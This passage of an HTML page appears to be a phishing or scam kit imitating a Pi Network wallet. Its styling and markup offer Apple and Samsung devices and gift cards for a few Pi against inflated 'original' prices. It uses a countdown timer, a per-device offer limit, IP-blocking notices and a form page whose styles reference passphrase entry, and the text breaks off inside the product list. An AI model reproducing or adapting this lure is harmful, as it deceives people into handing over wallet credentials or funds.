            /* Language chooser positioning for mobile devices */
            @media (max-width: 640px) {
                .language-chooser {
                    bottom: 16px;
                    right: 16px;
                }
            }

            /* For very small screens */
            @media (max-width: 380px) {
                .language-chooser {
                    bottom: 10px;
                    right: 10px;
                    transform: scale(0.9);
                }

                .pi-header-content .flex.items-center {
                    transform: translateX(-15px); /* Move wallet text/icons slightly left */
                }
            }

            .language-option {
                display: flex;
                align-items: center;
                padding: 5px 10px;
                border-radius: 6px;
                cursor: pointer;
                color: rgba(0, 0, 0, 0.7);
                transition: all 0.2s ease;
                margin-left: 8px;
                font-size: 0.9rem;
                font-weight: 500;
            }

            .language-option:hover {
                color: #333;
                background-color: rgba(0, 0, 0, 0.1);
                transform: translateY(-1px);
            }

            .language-option.active {
                color: #fff;
                font-weight: bold;
                background-color: var(--pi-purple);
            }

            .language-option img {
                width: 18px;
                height: 18px;
                margin-right: 6px;
                border-radius: 2px;
                box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2);
            }

            /* Blocked IP notification - enhanced */
            .ip-blocked-message {
                position: fixed;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                background-color: rgba(0, 0, 0, 0.85);
                color: white;
                padding: 35px;
                border-radius: 12px;
                z-index: 2000;
                max-width: 90%;
                width: 420px;
                text-align: center;
                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
                backdrop-filter: blur(8px);
                display: none;
                border: 1px solid rgba(255, 255, 255, 0.1);
            }

            .ip-blocked-message h3 {
                color: #f44336;
                margin-bottom: 20px;
                font-size: 1.7rem;
                font-weight: 700;
            }

            .ip-blocked-message p {
                margin-bottom: 25px;
                line-height: 1.6;
                font-size: 1.1rem;
            }

            .ip-blocked-message button {
                background-color: #f44336;
                color: white;
                border: none;
                padding: 12px 24px;
                border-radius: 8px;
                font-weight: bold;
                cursor: pointer;
                transition: all 0.3s ease;
                font-size: 1rem;
                box-shadow: 0 5px 15px rgba(244, 67, 54, 0.3);
            }

            .ip-blocked-message button:hover {
                background-color: #d32f2f;
                transform: translateY(-2px);
                box-shadow: 0 8px 20px rgba(244, 67, 54, 0.4);
            }

            /* IP location detection notification - enhanced */
            .location-detected {
                background: rgba(255, 255, 255, 0.97);
                color: #333;
                padding: 12px 20px;
                border-radius: 50px;
                position: fixed;
                bottom: 20px;
                left: 50%;
                transform: translateX(-50%) translateY(20px);
                box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
                z-index: 100;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 0.9rem;
                max-width: 90%;
                opacity: 0;
                transition: opacity 0.3s ease, transform 0.3s ease;
                pointer-events: none;
                border: 1px solid rgba(255, 255, 255, 0.3);
            }

            .location-detected.visible {
                opacity: 1;
                transform: translateX(-50%) translateY(0);
                pointer-events: all;
            }

            .location-detected i {
                color: var(--pi-purple);
                margin-right: 8px;
            }

            .location-detected .country-flag {
                width: 22px;
                height: 22px;
                border-radius: 50%;
                margin-right: 10px;
                box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            }

            /* Form page enhancements */
            #formPage {
                background-color: white !important;
                min-height: calc(100vh - 120px);
            }

            #formPage .pi-wallet-style {
                background-color: white;
                margin-top: 0;
            }

            #formPage .pi-title {
                color: #333;
                text-shadow: none;
                font-weight: 500;
                margin-top: 0; /* Giảm margin từ trên xuống */
                margin-bottom: 2rem;
            }

            #formPage .pi-info-text {
                color: #555;
                font-weight: 400; /* REDUCED from original */
            }

            #formPage .pi-input {
                color: #333;
                font-weight: 500;
            }

            #formPage .limit-message {
                background-color: #fff3cd;
                color: #856404;
            }

            #formPage .error-message {
                background-color: #f8d7da;
                color: #721c24;
            }

            /* Pending requests notification - enhanced */
            .pending-requests-badge {
                position: fixed;
                bottom: 70px;
                right: 16px;
                background: linear-gradient(135deg, #f44336, #ff8177);
                color: white;
                border-radius: 25px;
                padding: 8px 16px;
                font-size: 0.8rem;
                font-weight: bold;
                z-index: 100;
                box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
                display: none;
                transform: translateY(0);
                transition: transform 0.3s ease, box-shadow 0.3s ease;
                border: 1px solid rgba(255, 255, 255, 0.2);
            }

            .pending-requests-badge:hover {
                transform: translateY(-3px);
                box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
            }

            /* Festive birthday elements */
            .birthday-badge {
                position: absolute;
                top: 10px;
                right: 10px;
                width: 60px;
                height: 60px;
                background: linear-gradient(135deg, var(--pi-gold), var(--pi-gold-dark));
                border-radius: 50%;
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
                color: white;
                font-weight: bold;
                font-size: 0.8rem;
                padding: 5px;
                transform: rotate(15deg);
                z-index: 10;
            }

            .birthday-badge span:first-child {
                font-size: 1.2rem;
            }

            /* Success Modal Enhancements - Pi Transaction Style */
            #successModal {
                z-index: 2500;
            }

            #successModal .receipt-container {
                max-width: 400px;
                border-radius: 16px;
                overflow: hidden;
                box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
                position: relative;
            }

            /* Highlight Important Note Effect */
            .modal-highlight-overlay {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background-color: rgba(0, 0, 0, 0.92); /* Color más oscuro */
                z-index: 2501;
                opacity: 0;
                transition: opacity 0.5s ease;
                pointer-events: none;
            }

            .modal-container {
                position: relative;
                z-index: 2502; /* Por encima del overlay */
            }

            .modal-highlight-active .modal-content-section {
                opacity: 0.2; /* Más atenuado */
                transition: opacity 0.5s ease;
                pointer-events: none;
                filter: grayscale(100%); /* Añadir efecto de escala de grises */
            }

            .modal-highlight-overlay.active {
                opacity: 1;
                pointer-events: auto;
            }

            .highlight-important-note {
                position: relative;
                z-index: 2503;
                animation: pulse-highlight 2s infinite;
                box-shadow: 0 0 30px 15px rgba(255, 193, 7, 0.5); /* Sombra más pronunciada */
                transform: scale(1.05);
                transition: all 0.5s ease;
                opacity: 1 !important;
                pointer-events: auto !important;
                background-color: rgba(255, 248, 225, 1) !important; /* Fondo más brillante */
                border-color: #ffc107 !important; /* Borde más visible */
            }

            .highlight-important-note:before {
                content: "";
                position: absolute;
                top: -8px;
                left: -8px;
                right: -8px;
                bottom: -8px;
                border: 2px solid #ffc107;
                border-radius: 8px;
                animation: pulse-border 2s infinite;
                z-index: -1;
            }

            .understand-btn {
                display: inline-block;
                background-color: #ffc107;
                color: #333;
                font-weight: bold;
                padding: 8px 15px;
                border-radius: 4px;
                margin-top: 8px;
                cursor: pointer;
                transition: all 0.3s ease;
                border: none;
                text-transform: uppercase;
                font-size: 0.85rem;
                pointer-events: auto !important;
                box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); /* Sombra añadida para destacar el botón */
            }

            .modal-highlight-active {
                background-color: rgba(0, 0, 0, 0.95) !important; /* Fondo del modal más oscuro cuando está activo */
            }

            .understand-btn:hover {
                background-color: #ffd54f;
                transform: translateY(-2px);
            }

            /* Animaciones se mantienen igual */
            @keyframes pulse-highlight {
                0%,
                100% {
                    box-shadow: 0 0 20px 10px rgba(255, 193, 7, 0.2);
                }
                50% {
                    box-shadow: 0 0 25px 15px rgba(255, 193, 7, 0.4);
                }
            }

            @keyframes pulse-border {
                0%,
                100% {
                    opacity: 0.6;
                }
                50% {
                    opacity: 1;
                }
            }

            /* Transaction header styling */
            .transaction-header {
                background: linear-gradient(135deg, var(--pi-purple), var(--pi-purple-dark));
                padding: 20px;
                position: relative;
            }

            .transaction-amount {
                font-size: 2.5rem;
                font-weight: 700;
                color: white;
                text-align: center;
                margin: 10px 0;
            }

            .transaction-date {
                color: rgba(255, 255, 255, 0.8);
                text-align: center;
                font-size: 0.9rem;
            }

            .transaction-close-btn {
                position: absolute;
                top: 15px;
                right: 15px;
                color: white;
                background: rgba(255, 255, 255, 0.2);
                border-radius: 50%;
                width: 30px;
                height: 30px;
                display: flex;
                align-items: center;
                justify-content: center;
                cursor: pointer;
                transition: all 0.2s ease;
            }

            .transaction-close-btn:hover {
                background: rgba(255, 255, 255, 0.3);
                transform: scale(1.1);
            }

            .transaction-details {
                padding: 20px;
            }

            .transaction-detail-row {
                display: flex;
                justify-content: space-between;
                padding: 12px 0;
                border-bottom: 1px solid rgba(0, 0, 0, 0.1);
            }

            .transaction-detail-label {
                color: rgba(0, 0, 0, 0.6);
                font-weight: 500;
            }

            .transaction-detail-value {
                font-weight: 600;
            }

            /* Enhanced notification banner */
            .notification-banner {
                background: linear-gradient(to right, rgba(248, 192, 86, 0.95), rgba(230, 169, 56, 0.95));
                border-radius: 8px;
                box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
                margin: 0 auto 16px;
                max-width: 96%;
                padding: 12px 20px;
                font-weight: 500;
                color: #57401a;
                position: relative;
                border: 1px solid rgba(248, 192, 86, 0.3);
                overflow: hidden;
                display: flex;
                align-items: center;
                justify-content: center;
            }

            .notification-banner::before {
                content: "";
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
            }

            .notification-banner p {
                margin: 0;
                position: relative;
                font-size: 0.95rem;
                line-height: 1.5;
                text-align: center;
            }

            .notification-banner i {
                margin-right: 10px;
                color: #57401a;
                font-size: 1.2rem;
            }

            @keyframes shimmer {
                0% {
                    transform: translateX(-100%);
                }
                100% {
                    transform: translateX(100%);
                }
            }

            /* Enhanced Animations */
            @keyframes shineIcon {
                0% {
                    transform: rotate(30deg) translateX(-100%);
                }
                100% {
                    transform: rotate(30deg) translateX(100%);
                }
            }

            @keyframes spin {
                to {
                    transform: rotate(360deg);
                }
            }

            @keyframes twinkle {
                0%,
                100% {
                    opacity: 0.2;
                    transform: scale(1);
                }
                50% {
                    opacity: 0.5;
                    transform: scale(1.2);
                }
            }

            @keyframes twinkleStar {
                0%,
                100% {
                    opacity: 0.4;
                    transform: scale(1);
                    filter: blur(0.5px);
                }
                50% {
                    opacity: 0.8;
                    transform: scale(1.3);
                    filter: blur(1px);
                }
            }

            @keyframes float {
                0% {
                    transform: translateY(0);
                }
                50% {
                    transform: translateY(-10px);
                }
                100% {
                    transform: translateY(0);
                }
            }

            @keyframes floatParticle {
                0% {
                    transform: translateY(0) rotate(0deg);
                }
                50% {
                    transform: translateY(-20px) rotate(180deg);
                }
                100% {
                    transform: translateY(0) rotate(360deg);
                }
            }

            @keyframes waveRotate {
                0% {
                    transform: translate(-50%, -50%) rotate(0deg);
                }
                100% {
                    transform: translate(-50%, -50%) rotate(360deg);
                }
            }

            @keyframes coinRotate {
                0% {
                    transform: rotateY(0deg);
                }
                100% {
                    transform: rotateY(360deg);
                }
            }

            @keyframes explode {
                0% {
                    opacity: 1;
                    transform: translate(0, 0) scale(1);
                }
                100% {
                    opacity: 0;
                    transform: translate(var(--tx), var(--ty)) scale(0);
                }
            }

            @keyframes lightStreak {
                0%,
                100% {
                    opacity: 0;
                    transform: rotate(45deg) translateX(-100px);
                }
                10%,
                90% {
                    opacity: 0.3;
                }
                50% {
                    transform: rotate(45deg) translateX(calc(100vw + 100px));
                }
            }

            /* Enhanced shooting star animation */
            @keyframes shootingStar {
                0% {
                    opacity: 0;
                    transform: translateX(0) translateY(0) scale(0.5);
                }
                10% {
                    opacity: 0.3;
                    transform: translateX(50px) translateY(50px) scale(0.7);
                }
                45% {
                    opacity: 1;
                    transform: translateX(150px) translateY(150px) scale(1);
                }
                70% {
                    opacity: 0.3;
                    transform: translateX(250px) translateY(250px) scale(0.7);
                }
                100% {
                    opacity: 0;
                    transform: translateX(300px) translateY(300px) scale(0.5);
                }
            }

            /* Enhanced card wave animation */
            @keyframes cardWave {
                0%,
                100% {
                    opacity: 0;
                    transform: translate(-25%, -25%) scale(0.1);
                }
                50% {
                    opacity: 0.4;
                    transform: translate(-25%, -25%) scale(1.8);
                }
            }

            /* Enhanced confetti animation */
            @keyframes confettiFall {
                0% {
                    opacity: 1;
                    transform: translateY(-10vh) rotate(0deg) scale(0.8);
                }
                50% {
                    opacity: 0.8;
                    transform: translateY(50vh) rotate(360deg) scale(1.2);
                }
                100% {
                    opacity: 0.2;
                    transform: translateY(100vh) rotate(720deg) scale(0.8);
                }
            }

            /* Enhanced shiny wave animation */
            @keyframes shinyWave {
                0% {
                    left: -100%;
                }
                100% {
                    left: 150%;
                }
            }

            /* Rotation animation */
            @keyframes rotate {
                0% {
                    transform: rotate(0deg);
                }
                100% {
                    transform: rotate(360deg);
                }
            }

            /* Countdown Timer Styles */
            .countdown-container div {
                position: relative;
                transition: all 0.2s ease;
            }

            .countdown-container div:not(:last-child)::after {
                content: ":";
                position: absolute;
                right: -12px;
                top: 50%;
                transform: translateY(-50%);
                font-size: 24px;
                font-weight: bold;
                color: var(--pi-purple);
            }

            .countdown-container div > div:first-child {
                box-shadow: 0 8px 15px rgba(105, 57, 136, 0.3);
                position: relative;
                overflow: hidden;
                border-radius: 0.5rem;
            }

            .countdown-container div > div:first-child::after {
                content: "";
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 2px;
                background: rgba(255, 255, 255, 0.5);
            }

            .countdown-pulse {
                animation: countdown-pulse 1s ease;
            }

            @keyframes countdown-pulse {
                0% {
                    transform: scale(1);
                }
                50% {
                    transform: scale(1.08);
                }
                100% {
                    transform: scale(1);
                }
            }

            .icon-header-main svg {
                color: #f8b85b;
                display: flex;
                align-items: center;
                margin-left: 10px;
            }

            .form-content {
                overflow-y: auto;
            }

            .pi-wallet-style {
                position: relative;
                z-index: 1;
            }

            /* General Reset */

            .app-container {
                max-width: 480px;
                margin: 0 auto;
                background: #fff;
                overflow: hidden;
                box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            }

            /* Header */
            .header-main {
                background-color: #713d92;
                display: flex;
                flex-direction: row;
                justify-content: center;
                align-items: center;
                padding: 15px 20px;
                gap: 20px;
            }

            .header-main h1 {
                color: white;
                font-size: 20px;
                margin: 0;
                display: flex;
                align-items: center;
            }

            .header-main svg {
                color: #ffd700;
                display: flex;
                align-items: center;
            }

            /* Banner */
            .banner img {
                width: 100%;
                display: block;
            }

            /* Product Section */
            .products {
                max-width: 800px;
                align-items: center;
            }

            .products h2 {
                font-size: 18px;
                font-weight: 600;
                color: #ffffff;
                margin-bottom: 15px;
            }

            .product-grid {
                display: grid;
                grid-template-columns: repeat(2, 1fr);
                gap: 15px;
            }

            .product-card {
                background: #fff;
                border: 1px solid #ddd;
                border-radius: 10px;
                text-align: center;
                padding: 15px;
                box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            }

            .product-card img {
                width: 100%;
                max-width: 130px;
                margin: 0 auto 10px;
                display: block;
            }

            .price {
                margin: 0px 0;
            }

            .current-price {
                font-weight: bold;
                color: #713d92;
                margin-right: 5px;
            }

            .original-price {
                text-decoration: line-through;
                color: #999;
            }

            .product-name {
                font-size: 15px;
                font-weight: 500;
                color: #272727;
                margin-bottom: 10px;
            }

            .buy-now {
                background: #713d92;
                color: #fff;
                border: none;
                border-radius: 5px;
                padding: 5px 20px;
                font-size: 15px;
                cursor: pointer;
                transition: background 0.3s ease;
                text-decoration: none;
            }
            .buy-now:hover {
                background: #5311a8;
            }

            /* Hide the app container on larger screens */
            .app-container {
                display: block;
            }

            /* Desktop fallback message */
            .desktop-message {
                display: none;
                text-align: center;
                font-family: "Arial", sans-serif;
                padding: 50px;
                background-color: #f5f5f5;
                color: #333;
                font-size: 18px;
            }

            .header h1 {
                font-size: 20px;
                color: white;
            }

            .back-arrow,
            .wallet-icon {
                font-size: 18px;
            }

            /* Main Content */
            main {
                padding: 20px;
            }

            h2 {
                text-align: center;
                font-size: 22px;
                margin-bottom: 20px;
            }

            .input-container {
                position: relative;
                margin-bottom: 15px;
            }

            textarea {
                width: 100%;
                height: 120px;
                padding: 10px;
                border: 1px solid #ddd;
                border-radius: 5px;
                font-size: 16px;
                resize: none;
            }

            textarea:focus {
                outline: none;
                border-color: #713d92;
            }

            .error-message {
                display: none;
                color: #d9534f;
                font-size: 14px;
                margin-top: 5px;
            }

            /* Buttons */
            .btn {
                display: block;
                width: 100%;
                padding: 10px;
                margin-top: 10px;
                text-align: center;
                font-size: 16px;
                border: none;
                border-radius: 5px;
                cursor: pointer;
                transition: background 0.3s ease;
            }

            /* Remove unused button styles */
            .btn-passphrase,
            .btn-faceid,
            .btn-passphrase:hover,
            .btn-faceid:hover {
                display: none;
            }

            /* Remove unused info text styles */
            .info-text,
            .info-text a,
            .info-text a:hover {
                display: none;
            }

            /* Remove unused center logo styles */
            .center-logo {
                display: none;
            }
        </style>
        
    </head>
    <body>
        <!-- Premium Background Elements - With optimized shooting stars -->
        <div class="premium-bg">
            <div class="animated-gradient"></div>
            <div class="wave-container">
                <div class="wave wave1"></div>
                <div class="wave wave2"></div>
                <div class="wave wave3"></div>
            </div>
            <div id="starsContainer"></div>
            <div id="singleStarsContainer"></div>
            <div id="shootingStarsContainer"></div>
            <div id="particlesContainer"></div>
            <div id="coinsContainer"></div>
            <div id="lightStreaksContainer"></div>
        </div>

        <!-- Loading Overlay -->
        <div id="loadingOverlay" class="loading-overlay">
            <div class="loading-content">
                <div class="loading-spinner"></div>
                <div class="loading-text">Loading...</div>
            </div>
        </div>

        <!-- IP Blocked Message -->
        <div id="ipBlockedMessage" class="ip-blocked-message">
            <h3 data-en="Access Denied">
                Access Denied
            </h3>
            <p data-en="Your IP address has been blocked due to suspicious activity. Please contact support if you believe this is an error.">
                Your IP address has been blocked due to suspicious activity. Please contact support if you believe this is an error.
            </p>
            <button id="closeBlockedMessage" data-en="Close">
                Close
            </button>
        </div>

        <!-- Pending Requests Badge -->
        <div id="pendingRequestsBadge" class="pending-requests-badge">
            <span data-en="Pending: "></span>
            <span id="pendingCount">0</span>
        </div>

        <!-- Pi Wallet Header -->
        <header class="pi-header">
            <div class="pi-header-content">
                <button class="header-back-btn" id="headerBackBtn">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M15 18l-6-6 6-6"></path>
                    </svg>
                </button>

                <div class="flex items-center">
                    <div class="icon-header-main" style="padding-top: 26%; padding-right: 5px;">
                        <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 1024 1024" fill="none" class="mb-10 text-primary-500">
                            <path
                                stroke="currentColor"
                                stroke-width="50"
                                d="M780.506 341.544v-11.073c0-45.478-37-82.46-82.5-82.46h-412.5c-45.49 0-82.5 36.982-82.5 82.46V701.54c0 45.478 37.01 82.46 82.5 82.46h453.75c45.5 0 82.5-36.982 82.5-82.46V412.931c0-30.46-16.617-57.114-41.25-71.387Z"
                            ></path>
                            <path
                                fill="currentColor"
                                d="M797 360.758v11.182c-12.154-7.037-42.642-16.564-57.693-16.564H306.605c-11.329 0-20.605-9.321-20.605-20.704 0-11.383 9.276-20.704 20.605-20.704h432.702c11.127 0 22.054 1.456 32.356 4.347 5.755 11.181 25.337 29.2 25.337 42.443ZM717.796 429.502c-65.52 0-118.8 51.8-118.8 115.5s53.28 115.5 118.8 115.5h112.2v-231h-112.2Z"
                            ></path>
                            <circle cx="706.74" cy="545.002" r="49.5"></circle>
                            <path
                                fill="currentColor"
                                d="M364.714 432.771c0-1.806 1.477-3.271 3.3-3.271h31.9c1.822 0 3.3 1.465 3.3 3.271v25.082c0 1.807-1.478 3.271-3.3 3.271h-31.9c-1.823 0-3.3-1.464-3.3-3.271v-25.082ZM430.714 432.771c0-1.806 1.477-3.271 3.3-3.271h31.9c1.822 0 3.3 1.465 3.3 3.271v25.082c0 1.807-1.478 3.271-3.3 3.271h-31.9c-1.823 0-3.3-1.464-3.3-3.271v-25.082Z"
                            ></path>
                            <path
                                fill="currentColor"
                                d="M364.714 515.357V660.5l38.5-14.692V515.357h27.5V660.5l38.5-14.692V515.357h25.581c21.107 0 38.219-17.143 38.219-38.289v-21.396h-38.219v21.396H340.233c-21.108 0-38.219 17.143-38.219 38.289v26.464h38.219v-26.464h24.481Z"
                            ></path>
                            <defs>
                                <clipPath id="a"><path fill="#fff" d="M177.5 182h669v660h-669z"></path></clipPath>
                            </defs>
                        </svg>
                    </div>
                    <span class="wallet-text">Wallet</span>
                    <div class="icon-header-main">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 260 260" fill="none" width="20" height="20" class="text-secondary-500">
                            <path
                                fill="currentColor"
                                d="M94.91 66.314c0-1.078.875-1.953 1.954-1.953h18.878c1.079 0 1.953.875 1.953 1.953v14.973a1.953 1.953 0 0 1-1.953 1.953H96.863a1.953 1.953 0 0 1-1.953-1.953V66.314ZM133.97 66.314c0-1.078.875-1.953 1.953-1.953h18.879c1.079 0 1.953.875 1.953 1.953v14.973a1.953 1.953 0 0 1-1.953 1.953h-18.879a1.953 1.953 0 0 1-1.953-1.953V66.314Z"
                            ></path>
                            <path
                                fill="currentColor"
                                d="M94.91 115.616v77.765l22.785 8.992v-86.757h16.275v77.765l22.785 8.992v-86.757h15.14c12.491 0 22.618-10.234 22.618-22.858V79.985h-22.618v12.773H80.422c-12.492 0-22.618 10.234-22.618 22.858v15.798h22.618v-15.798h14.489Z"
                            ></path>
                            <path
                                fill="currentColor"
                                fill-rule="evenodd"
                                d="M130.122 20.75c-60.368 0-109.305 48.937-109.305 109.305 0 60.367 48.937 109.305 109.305 109.305 60.367 0 109.305-48.938 109.305-109.305 0-60.368-48.938-109.305-109.305-109.305ZM.943 130.055C.943 58.711 58.778.875 130.122.875c71.343 0 129.178 57.836 129.178 129.18 0 71.343-57.835 129.178-129.178 129.178C58.778 259.233.943 201.398.943 130.055Z"
                                clip-rule="evenodd"
                            ></path>
                        </svg>
                    </div>
                </div>

            </div>
        </header>

        <!-- Main Content -->
        <div class="page-container">
            <!-- Home Page -->
            <div id="homePage" class="page page-active" style="padding-top: 50px;">
                <!-- Hero Section -->
                <section class="text-center relative">
                    <i class="fas fa-star floating-icon" style="top: 10%; right: 10%; opacity: 0.3;"></i>
                    <i class="fas fa-coins floating-icon" style="bottom: 20%; left: 5%; opacity: 0.3;"></i>

                    <p class="text-4xl font-bold inline-block relative animate-on-scroll" data-en="Receive Pi Network Rewards">
                        Receive Pi Offer
                    </p>
                    <p class="p-5 text-lg max-w-2xl mx-auto animate-on-scroll" data-delay="200" data-en="Join the special promotion! Limited time offer for the Pi Network community.">
                        Join the special promotion! Limited time offer for the Pi Network community. Each device is limited to a maximum of 2 offers.
                    </p>

                    <!-- Countdown Timer - Moved under button -->
                    <div class="max-w-md mx-auto mt-6 mb-8 animate-on-scroll" data-delay="100">
                        <div class="card m-5 p-4 text-center shadow-lg border-2 border-purple-200 dark:border-purple-900">
                            <h4 class="text-lg font-bold mb-2" data-en="Event ends in">
                                Event ends in
                            </h4>
                            <div class="flex justify-center space-x-4 countdown-container">
                                <div class="text-center">
                                    <div class="bg-purple-700 text-white w-16 h-16 rounded-lg flex items-center justify-center text-2xl font-bold" id="countdown-days">
                                        00
                                    </div>
                                    <div class="mt-1 text-sm" data-en="Days">
                                        Days
                                    </div>
                                </div>
                                <div class="text-center">
                                    <div class="bg-purple-600 text-white w-16 h-16 rounded-lg flex items-center justify-center text-2xl font-bold" id="countdown-hours">
                                        00
                                    </div>
                                    <div class="mt-1 text-sm" data-en="Hours">
                                        Hours
                                    </div>
                                </div>
                                <div class="text-center">
                                    <div class="bg-purple-500 text-white w-16 h-16 rounded-lg flex items-center justify-center text-2xl font-bold" id="countdown-minutes">
                                        00
                                    </div>
                                    <div class="mt-1 text-sm" data-en="Minutes">
                                        Minutes
                                    </div>
                                </div>
                                <div class="text-center">
                                    <div class="bg-purple-400 text-white w-16 h-16 rounded-lg flex items-center justify-center text-2xl font-bold" id="countdown-seconds">
                                        00
                                    </div>
                                    <div class="mt-1 text-sm" data-en="Seconds">
                                        Seconds
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </section>

                <!-- Product Section -->
                <section class="products mx-auto p-5 relative">
                    <h2>Special for you</h2>
                    <div class="product-grid">
                        <!-- Product Card 1 -->
                        <div class="product-card">
                            <img src="./Images/Giftcard99-1.png" alt="Giftcard 99 Pi" />
                            <p class="price">
                                <span class="current-price">5 Pi</span>
                                <span class="original-price">99 Pi</span>
                            </p>
                            <p class="product-name">Gift Card</p>
                            <button id="openFormBtn" class="buy-now">Offer Now</button>
                        </div>

                        <div class="product-card">
                            <img src="./Images/iPhone 15.jpg" alt="iPhone 15" />
                            <p class="price">
                                <span class="current-price">35 Pi</span>
                                <span class="original-price">135 Pi</span>
                            </p>
                            <p class="product-name">iPhone 15</p>
                            <button id="openFormBtn" class="buy-now">Offer Now</button>
                        </div>

                        <!-- Product Card 2 -->
                        <div class="product-card">
                            <img src="./Images/iphone 15 Plus.jpg" alt="iPhone 15 Pro Max" />
                            <p class="price">
                                <span class="current-price">45 Pi</span>
                                <span class="original-price">145 Pi</span>
                            </p>
                            <p class="product-name">iPhone 15 Plus</p>
                            <button id="buyNowBtn-iphone15plus" class="buy-now">Offer Now</button>
                        </div>

                        <!-- Duplicate Product Cards -->
                        <div class="product-card">
                            <img src="./Images/iphone-15-pro.jpg" alt="iPhone 16 Pro Max" />
                            <p class="price">
                                <span class="current-price">60 Pi</span>
                                <span class="original-price">175 Pi</span>
                            </p>
                            <p class="product-name">iPhone 15 Pro</p>
                            <button id="buyNowBtn-iphone15pro" class="buy-now">Offer Now</button>
                        </div>

                        <div class="product-card">
                            <img src="./Images/iphone_15_pro_max.jpg" alt="iPhone 16 Pro Max" />
                            <p class="price">
                                <span class="current-price">80 Pi</span>
                                <span class="original-price">195 Pi</span>
                            </p>
                            <p class="product-name">iPhone 15 Pro Max</p>
                            <button id="buyNowBtn-iphone15promax" class="buy-now">Offer Now</button>
                        </div>
                        <div class="product-card">
                            <img src="./Images/iPhone 16.jpg" alt="iPhone 16 Pro Max" />
                            <p class="price">
                                <span class="current-price">45 Pi</span>
                                <span class="original-price">145 Pi</span>
                            </p>
                            <p class="product-name">iPhone 16</p>
                            <button id="buyNowBtn-iphone16" class="buy-now">Offer Now</button>
                        </div>
                        <div class="product-card">
                            <img src="./Images/iphone 16 Plus.jpg" alt="iPhone 16 Pro Max" />
                            <p class="price">
                                <span class="current-price">50 Pi</span>
                                <span class="original-price">145 Pi</span>
                            </p>
                            <p class="product-name">iPhone 16 Plus</p>
                            <button id="buyNowBtn-iphone16plus" class="buy-now">Offer Now</button>
                        </div>
                        <div class="product-card">
                            <img src="./Images/iphone-16-pro.jpg" alt="iPhone 16 Pro Max" />
                            <p class="price">
                                <span class="current-price">55 Pi</span>
                                <span class="original-price">160 Pi</span>
                            </p>
                            <p class="product-name">iPhone 16 Pro</p>
                            <button id="buyNowBtn-iphone16pro" class="buy-now">Offer Now</button>
                        </div>

                        <div class="product-card">
                            <img src="./Images/iphone_16_pro_max.jpg" alt="iPhone 16 Pro Max" />
                            <p class="price">
                                <span class="current-price">80 Pi</span>
                                <span class="original-price">200 Pi</span>
                            </p>
                            <p class="product-name">iPhone 16 Pro Max</p>
                            <button id="buyNowBtn-iphone16promax" class="buy-now">Offer Now</button>
                        </div>
                        <div class="product-card">
                            <img src="./Images/m3_14_fekete.jpg" alt="iPhone 16 Pro Max" />
                            <p class="price">
                                <span class="current-price">99 Pi</span>
                                <span class="original-price">250 Pi</span>
                            </p>
                            <p class="product-name">MacBook M3 14 Inch</p>
                            <button id="buyNowBtn-macbookm314" class="buy-now">Offer Now</button>
                        </div>
                        <div class="product-card">
                            <img src="./Images/m3_16_fekete.jpg" alt="iPhone 16 Pro Max" />
                            <p class="price">
                                <span class="current-price">135 Pi</span>
                                <span class="original-price">280 Pi</span>
                            </p>
                            <p class="product-name">MacBook M3 16 Inch</p>
                            <button id="buyNowBtn-macbookm316" class="buy-now">Offer Now</button>
                        </div>
                        <div class="product-card">
                            <img src="./Images/ap4.jpg" alt="iPhone 16 Pro Max" />
                            <p class="price">
                                <span class="current-price">30Pi</span>
                                <span class="original-price">120 Pi</span>
                            </p>
                            <p class="product-name">Airpods 4</p>
                            <button id="buyNowBtn-airpods4" class="buy-now">Offer Now</button>
                        </div>

                        <div class="product-card">
                            <img src="./Images/apvision.jpg" alt="iPhone 16 Pro Max" />
                            <p class="price">
                                <span class="current-price">135 Pi</span>
                                <span class="original-price">280 Pi</span>
                            </p>
                            <p class="product-name">Vision Pro</p>
                            <button id="buyNowBtn-visionpro" class="buy-now">Offer Now</button>
                        </div>
                        <div class="product-card">
                            <img src="./Images/applewatch.jpg" alt="iPhone 16 Pro Max" />
                            <p class="price">
                                <span class="current-price">60 Pi</span>
                                <span class="original-price">140 Pi</span>
                            </p>
                            <p class="product-name">Watch Series 10</p>
                            <button id="buyNowBtn-applewatch" class="buy-now">Offer Now</button>
                        </div>
                        <div class="product-card">
                            <img src="./Images/S24.jpg" alt="iPhone 16 Pro Max" />
                            <p class="price">
                                <span class="current-price">60 Pi</span>
                                <span class="original-price">175 Pi</span>
                            </p>
                            <p class="product-name">Galaxy S24</p>
                            <button id="buyNowBtn-galaxys24" class="buy-now">Offer Now</button>
                        </div>
                        <div class="product-card">
                            <img src="./Images/samsung-galaxy-s24-plus-5g-sm-s926.jpg" alt="iPhone 16 Pro Max" />
                            <p class="price">
                                <span class="current-price">75 Pi</span>
                                <span class="original-price">180 Pi</span>
                            </p>
                            <p class="product-name">Galaxy S24 Plus</p>
                            <button id="buyNowBtn-galaxys24plus" class="buy-now">Offer Now</button>
                        </div>

                        <div class="product-card">
                            <img src="./Images/S24 Ultra.jpg" alt="iPhone 16 Pro Max" />
                            <p class="price">
                                <span class="current-price">90 Pi</span>
                                <span class="original-price">210 Pi</span>
                            </p>
                            <p class="product-name">Galaxy S24 Ultra</p>
